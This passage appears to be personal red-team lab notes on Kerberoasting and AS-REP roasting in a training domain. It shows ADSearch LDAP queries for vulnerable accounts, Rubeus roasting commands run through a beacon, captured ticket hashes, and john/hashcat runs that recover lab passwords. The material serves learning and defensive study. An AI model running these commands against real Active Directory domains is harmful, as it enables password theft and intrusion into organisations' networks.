$krb5tgs$23$*honey_svc$dev.cyberbotic.io$HoneySvc/fake.dev.cyberbotic.io@dev.cyberbotic.io*$F5F0F44B1D94DCD378CAF4C4CF0298D6$D7447D873205713E3ED25B6A3D1B4F71ED40A520E37882E3C042BD844F93935B34CF0C00EE66AA70DE7A3BA80C3A6EA6E5D0BDD8FE6CCDEDCF291D0FD5AC1DCF2AF41748278D06F26F48528DA1F7B0E641C019817E91555CFCCF4F0768AD2FDD6D85AB89C330FDA7FE19EAAD172EBDD2B4AB0ABEA804518349E76A6949AD1F58BD87AE33C8CD7087C7990F1D3E9D5133908218E3C354BDDC7B31FADEB625F1A7F7B0F2AC53078CBEDBB339F0B8F850ADC31B927DA9003B64BD988DF459B86D74CA675D4571869D8BBC7B28BDC1101358692537C4B413CA341C87270A798D0F105F6E25E11A7505FBD8F1E193553C612A342184E548636A87DE765928AFB23C496FBE1C5B531955C3B9CD696F83284C464168302EB6754A9E348A4F386A9E0A93A938BB4F59778284FA19122725069EAAC38446560ECA27E5A8EDFC1D7330162CD336220EB00B06151174E8BB0CA3B03C4C968B989A7791993C003A8FC071E7DF991AF9280206E60496F71768CD5C3BB0E9DB35C9D8750B031C8341F31E1C937E5B60C4CCE990D930AEF52112690646F160FA1AE86A9AF0C2047F6EDFBFB486985DC37FDC5C707345DFE4E243A2A38C56DFAABC34C20A301C22394A559B36947FE66A74909A346B99FF3B4B1AEF7DA8A955BAF1A7466F09905251E73F155D89B248FB4CEEE1F593E3DEADC80605D0EDB818AF2539DBB1F5ECB403D08D70854CB83362F9137373EFAED4C49DB51B6227BA020CFF3E20A44D9BE2C4C778647EFA8148B6062CF4C7EC5D2E121D9816D1886A6036FA485625D7271649F6C4D8C95186B0838F586148226B62EAB5FCCDF7B3CAEFE6FB64C476B00160453355F428E38AC635BAA4AAF1D3BD3E046E90732F751ED1C88CBFBAB4B6FA025548E9EDE65E8EA506667C862F89AF4833237F60AB83A28598EAD39686865AFF4EF400DF123444DF982653E5033A5964364C0BE503B3905A7F34904584FBB0F55BB0D3CD98B124E3628688A63E0D396D2E980E956F72516BAE6AC9DDE0FFA79C282C5A53CCF458DC8CC9683F8D4DA3AA77EAEF088B36378E3CB20E515E9B258942F4C7B17B42B3090C19CC038BAE8F8121232B7FD2008D88335E67936FD02FF90F7979FEB69AC9D830AF70D226FF412C7578749005FEC1D27D2002C36D237EFDB55DD250C37D56627759DC80261D97F6FE0F281B0C569E2BA2662181D90185DA0CFA8C5DFF2F3D716AF9A2F7DB867357D8D98D2527FF72D83AD0294C145AD530E947598A7545E22FF3B525AFA395AF23AF2FF2CF62EBE744095B4CA60DF56C3D11B9D403507CD3306124A9AE4F49465058113F677162B7BF5E1A121F4B28654BEAD4C0C7465D2A29A97BEB3AB0D08DDAFBF8A9359BF473369B172714A179117785F4F4C1ED546477ED8B8576A6E1A436ACF519E4544480E214C0C1C43D3EBEBE6FF2A31515AD91B14547BEF10C6DB0CECCAC6288BE2A77E5D2783964CF18625DF17FB18A075A41D64593E05C366F120E73782E09A00C67F01ECCA596255E489A188530463365A1D45733647C33E447723AB85AA2DE18D7D709B94B4D950B6BE2834F4361FE9D6DB19FCDE131994FDCB4602042
```

{% hint style="info" %}
&#x20;Even though Rubeus does not include the `krbtgt` account, it can [sometimes](https://twitter.com/_wald0/status/1361720293539139589) be cracked.
{% endhint %}

### Cracking Kerberoastable Hashes

{% hint style="warning" %}
I experienced some hash format incompatibility with john.  Removing the SPN so it became: `$krb5tgs$23$*mssql_svc$dev.cyberbotic.io*$6A9E[blah]` seemed to address the issue.

```
$krb5tgs$23$*mssql_svc$dev.cyberbotic.io*$57A749FC1E6C15940497B032BB9A1471$56E5F4C625A9B672585444F22921A0215A7582F951265656310BD609E58759EEA6F34923796A7FED0A3099B739C8DB082E476DB426235C7845557038E57E683B6860CCE684B4BB48FB0BEDDE2B1010D85EA88D6CDD7A3223D2126479E562E73ECB23488C94A0444CE5653EEB468683D19A9739F993E12D00DF60B30B347A23A34887B7FFCBE73AF676E2748575FF56A84AF12B8B2263D830934A0A9EFE7F2570141CF832BEEE777EF95EDE660D1651B3F53BAB9D308930934B844344D65CDB15F98328FD53119A129B0F49A37B440EF88AD7AF6E85C738A38965DDCCAA1F16F8BFD945F4DFB89E49F3238959F443E78B7DAE92C56C949CC9CF3D9DE7712A2D985FC59F657EAB524B331109DABD3F42F9B9A50D8CF6C3BB35D3A90D13FAFCB217B9D916051EFA381F41E8E3B5811309871C41467FAEE064DDAA2FE8C102747D471A48BA7B6CB4D0901E4061F6B4FAEE9EA1839C20FFDB94AC6CBD897D016F37D859495FD95A9C86E093C32321AEEFD7C57E33B2591B6998BA3FCBDE711F4823C13ECF6CB637E6A8F4A577695CD4DE076D5174F02CD3C8A88502BA78AFB3EAC8D16939B1C669FCFFD20B7975B7166DFB84454C721CF632B857766BBAB4D0D079AEA2F0D47F5E4974021A8D69A3B5802A622976C7880F2377BD25607B9E9A3736069DA6CB75BE06B065C542421D2BE33F3E4537B6B8D9A85ABB1205EFD63A607C2234A1F84CB2A62433283FC426360BE8F13FFE89D3804C52F4F1D35E122164CE3887947A7A23BD2AB2DEEA49EF68C1D8957877D6C4801AF50AA1FA15CFF52BDD5817432D38E888E1808FFF114608646FE5C18E2C75AC7C0BFF808CBAB17354A492551B2576A90425AAAD02AB329FAEBE4BD43A2CFE0563D307ADA9710D91ED983E52633EBC560686300A921AD5EC27B7D82C35932F1CF34FB6DB592CE5EBCCCFAF09B2E9B71831DE4397EE72303AE3DD98A952B3031E4A776C02CD18D135F5260253365CAF8CADC2E39EFCBCC343CF9B016E68B6DC95C928D4A9C7AEB8061A7D6BDFD432444426F663F09488463A333BC4FBDBF816428150B304F775A3030B3E61FCA1BBC68889DF408E2F201E6E433A72D2AC5BDCDABAAF202CE6C5725CAEB8BCA3B09276609F632F6C69560CCC261ABDBF23B6003038610CE926F108867F76BD625C3D49D4389E4B51F3B68F498ECF0B15171E88F1099A27475E2227A3C6E500316D6BCA0EF0BCFA5CD0913495243FBE5EEEE335742F9EBB76A173CAA83B12CE00D17A814389D4E9F38302DA3C07096DEA62742E351733E4350B3480C2EA9E3A22F1AF39B404E3A80F6C8E36E4759BF36D9A32A357B2695300F0AE624D4952E0950AE7C2A58B5C0238188E9AAE21BFB4E5E9ACC2ACF1C8B3AC25EE958AE41BE08A53E160FE064EF5220874DE275B9E29EA7C816E44149737BF7F3F2BC60005314A272660C420457232D5EFB0FC1C0A8CA6D34C907CA1969E671E52055805F54BD1241E3F4C6E55B8A1517AD9DA058D0166E1C43075638E18B77E3A8E08C9340C7689147B61F11A1EED833D4409A550E574911E3C1647D1FF49D78381A9C643AFB63637B1B1A0F0CC0B14B96B
```
{% endhint %}

```
john --format=krb5tgs --wordlist=wordlist mssql_svc

Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Cyberb0tic       (?)   
```

### Using LDAP to Enumerate Possible Kerberoastable Candidates

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName

[*] TOTAL NUMBER OF SEARCH RESULTS: 4
	[+] cn                   : krbtgt
	[+] servicePrincipalName : kadmin/changepw
	[+] samAccountName       : krbtgt
	[+] cn                   : MS SQL Service
	[+] servicePrincipalName : MSSQLSvc/sql-2.dev.cyberbotic.io:1433
	[+] samAccountName       : mssql_svc
	[+] cn                   : Squid Proxy
	[+] servicePrincipalName : HTTP/squid.dev.cyberbotic.io
	[+] samAccountName       : squid_svc
	[+] cn                   : Honey Token
	[+] servicePrincipalName : HoneySvc/fake.dev.cyberbotic.io
	[+] samAccountName       : honey_svc
```

**We can roast an individual account the `/user` parameter:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap

$krb5tgs$23$*mssql_svc$dev.cyberbotic.io$MSSQLSvc/sql-2.dev.cyberbotic.io:1433@dev.cyberbotic.io*$57A749FC1E6C15940497B032BB9A1471$56E5F4C625A9B672585444F22921A0215A7582F951265656310BD609E58759EEA6F34923796A7FED0A3099B739C8DB082E476DB426235C7845557038E57E683B6860CCE684B4BB48FB0BEDDE2B1010D85EA88D6CDD7A3223D2126479E562E73ECB23488C94A0444CE5653EEB468683D19A9739F993E12D00DF60B30B347A23A34887B7FFCBE73AF676E2748575FF56A84AF12B8B2263D830934A0A9EFE7F2570141CF832BEEE777EF95EDE660D1651B3F53BAB9D308930934B844344D65CDB15F98328FD53119A129B0F49A37B440EF88AD7AF6E85C738A38965DDCCAA1F16F8BFD945F4DFB89E49F3238959F443E78B7DAE92C56C949CC9CF3D9DE7712A2D985FC59F657EAB524B331109DABD3F42F9B9A50D8CF6C3BB35D3A90D13FAFCB217B9D916051EFA381F41E8E3B5811309871C41467FAEE064DDAA2FE8C102747D471A48BA7B6CB4D0901E4061F6B4FAEE9EA1839C20FFDB94AC6CBD897D016F37D859495FD95A9C86E093C32321AEEFD7C57E33B2591B6998BA3FCBDE711F4823C13ECF6CB637E6A8F4A577695CD4DE076D5174F02CD3C8A88502BA78AFB3EAC8D16939B1C669FCFFD20B7975B7166DFB84454C721CF632B857766BBAB4D0D079AEA2F0D47F5E4974021A8D69A3B5802A622976C7880F2377BD25607B9E9A3736069DA6CB75BE06B065C542421D2BE33F3E4537B6B8D9A85ABB1205EFD63A607C2234A1F84CB2A62433283FC426360BE8F13FFE89D3804C52F4F1D35E122164CE3887947A7A23BD2AB2DEEA49EF68C1D8957877D6C4801AF50AA1FA15CFF52BDD5817432D38E888E1808FFF114608646FE5C18E2C75AC7C0BFF808CBAB17354A492551B2576A90425AAAD02AB329FAEBE4BD43A2CFE0563D307ADA9710D91ED983E52633EBC560686300A921AD5EC27B7D82C35932F1CF34FB6DB592CE5EBCCCFAF09B2E9B71831DE4397EE72303AE3DD98A952B3031E4A776C02CD18D135F5260253365CAF8CADC2E39EFCBCC343CF9B016E68B6DC95C928D4A9C7AEB8061A7D6BDFD432444426F663F09488463A333BC4FBDBF816428150B304F775A3030B3E61FCA1BBC68889DF408E2F201E6E433A72D2AC5BDCDABAAF202CE6C5725CAEB8BCA3B09276609F632F6C69560CCC261ABDBF23B6003038610CE926F108867F76BD625C3D49D4389E4B51F3B68F498ECF0B15171E88F1099A27475E2227A3C6E500316D6BCA0EF0BCFA5CD0913495243FBE5EEEE335742F9EBB76A173CAA83B12CE00D17A814389D4E9F38302DA3C07096DEA62742E351733E4350B3480C2EA9E3A22F1AF39B404E3A80F6C8E36E4759BF36D9A32A357B2695300F0AE624D4952E0950AE7C2A58B5C0238188E9AAE21BFB4E5E9ACC2ACF1C8B3AC25EE958AE41BE08A53E160FE064EF5220874DE275B9E29EA7C816E44149737BF7F3F2BC60005314A272660C420457232D5EFB0FC1C0A8CA6D34C907CA1969E671E52055805F54BD1241E3F4C6E55B8A1517AD9DA058D0166E1C43075638E18B77E3A8E08C9340C7689147B61F11A1EED833D4409A550E574911E3C1647D1FF49D78381A9C643AFB63637B1B1A0F0CC0B14B96B
```

## ASREP Roasting

If a user does not have Kerberos pre-authentication enabled, an AS-REP can be requested for that user, and part of the reply can be cracked offline to recover their plaintext password.&#x20;

This configuration is enabled on the User Object and is often seen on accounts that are associated with Linux systems.

**As with kerberoasting, we don't want to asreproast every account in the domain:**

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname

    ___    ____  _____                 __  
   /   |  / __ \/ ___/___  ____ ______/ /_ 
  / /| | / / / /\__ \/ _ \/ __ `/ ___/ __ \
 / ___ |/ /_/ /___/ /  __/ /_/ / /__/ / / /
/_/  |_/_____//____/\___/\__,_/\___/_/ /_/ 
                                           
Twitter: @tomcarver_
GitHub: @tomcarver16
            
[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 
[*] TOTAL NUMBER OF SEARCH RESULTS: 1
	[+] cn                : Squid Proxy
	[+] distinguishedname : CN=Squid Proxy,CN=Users,DC=dev,DC=cyberbotic,DC=io
	[+] samaccountname    : squid_svc
```

**Then perform the ASREP Roast:**

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap

      $krb5asrep$squid_svc@dev.cyberbotic.io:F3C3751D37956F316B23D008A488D773$48ED8C3A63E9C6DE9ADD425C390719F2C92D8AA0083496795766E87CCDFE0600DD9D8EFB774381673E13576BBB7113F6ED69A1F25A5F132AAEDE1EC7E0E28024F3AB744226EBCB6408636C10CF1C8497C40F0FDCC8F46BC44FBCE41EFC38BC64F6B63F629C609C46A4883D18B3AE928D14735081A249532F4AB3DD92DD0D75000403022ADE657B78C86141A8D9D7728355D19E61E0792E1B2F85A1532E6F778C0AD5830C781BA87B21A9F95FE8C3CBCC9D47617D829B709602891A779EC96AE6BDB8BB51A0CEC379C9C7DFA0E1EAF0A9FA8ADF59D0D6317DB0DF4B22F2C58EDD8DE1ADDF6F4CA7F61B1A5EC46C64E5D5F175F43D767F

```

#### Cracking

```
Use --format=krb5asrep --wordlist=wordlist squid_svc for john or -a 0 -m 18200 squid_svc wordlist for hashcat.

$ john --format=krb5asrep --wordlist=wordlist squid_svc
Passw0rd!        ($krb5asrep$squid_svc@dev.cyberbotic.io)
```

## Unconstrained Delegation

Coming soon. Burnt out from this.
